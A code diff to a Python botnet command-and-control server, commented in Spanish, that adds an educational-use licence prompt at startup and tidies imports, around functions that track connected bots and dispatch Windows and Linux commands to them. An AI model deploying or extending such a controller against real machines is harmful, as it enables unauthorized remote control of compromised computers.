@@ -1,12 +1,67 @@
 import socket
 import threading
 import time
+import os
 
 HOST = "172.31.128.167" # IP del servidor
 PORT = 9999 # Puerto que escucha
 bots = [] # List de bots
 bot_ids = {} # Diccinario con los IDS de los bots
 sistemas_operativos = {}  # Diccionario para almacenar el SO de cada bot
+respuestas_bots = {}  # Diccionario para almacenar las últimas respuestas de los bots
+
+import os
+
+def verificar_eula(tipo):
+    """
+    Verifica si el usuario ha aceptado la licencia antes de ejecutar el programa.
+    
+    :param tipo: "servidor" o "cliente" para determinar qué EULA verificar.
+    """
+    if tipo not in ["servidor", "cliente"]:
+        raise ValueError("Tipo de EULA no válido. Debe ser 'servidor' o 'cliente'.")
+
+    eula_path = f"eula_{tipo}.txt"
+
+    # Si no existe, lo crea
+    if not os.path.exists(eula_path):
+        with open(eula_path, "w") as f:
+            f.write("ACCEPTED=False")
+
+    # Leer si ya aceptó
+    with open(eula_path, "r") as f:
+        for linea in f:
+            if "ACCEPTED=True" in linea:
+                return True
+
+    # Mostrar Acuerdo de Licencia
+    print("\n" + "="*50)
+    print(f"📜  ACUERDO DE LICENCIA ({tipo.upper()}) 📜")
+    print("="*50)
+    print("\nEste software es exclusivamente para propósitos educativos y de investigación.")
+    print("El uso en redes ajenas sin autorización está prohibido.")
+    print("El usuario debe cumplir con las leyes de su país.")
+    print("No se permite el uso de este software en redes públicas.")
+    print("El autor no se hace responsable del uso indebido.\n")
+    
+    print("🔴  QUEDA TERMINANTEMENTE PROHIBIDO:")
+    print("   - Usarlo con intenciones maliciosas.")
+    print("   - Ejecutarlo en infraestructuras críticas sin permiso.")
+    print("   - Modificarlo para evadir restricciones.")
+    print("   - Distribuirlo con fines ilegales o comerciales.\n")
+    
+    print("💡  Al escribir 'ACEPTO', el usuario declara que asume toda la responsabilidad sobre su uso.\n")
+    
+    respuesta = input("Escriba 'ACEPTO' para continuar: ").strip().upper()
+    
+    if respuesta == "ACEPTO":
+        with open(eula_path, "w") as f:
+            f.write("ACCEPTED=True")
+        return True
+    else:
+        print("Debe aceptar la licencia para usar este software.")
+        exit()
+
 
 def manejar_bot(conn, addr, bot_id):
     """
@@ -249,8 +304,6 @@ def menu_comandos():
 
     enviar_comando(comando_windows, comando_linux)
 
-import time
-
 def enviar_comando(comando_windows, comando_linux):
     """
     Selecciona bots para enviar comandos y espera todas las respuestas antes de mostrar el menú de nuevo.
@@ -315,11 +368,6 @@ def enviar_comando(comando_windows, comando_linux):
 
     print("\n--- Volviendo al menú principal ---\n")
     time.sleep(2)
-
-
-respuestas_bots = {}  # Diccionario para almacenar las últimas respuestas de los bots
-
-import time
 
 def enviar_comando_a_bot(bot, comando_windows, comando_linux):
     """
@@ -403,6 +451,6 @@ def cerrar_conexion_bots():
 
     print(f"Bot {bot_id} eliminado correctamente del sistema.")
 
-
 if __name__ == "__main__":
+    verificar_eula("servidor")
     servidor_CnC()
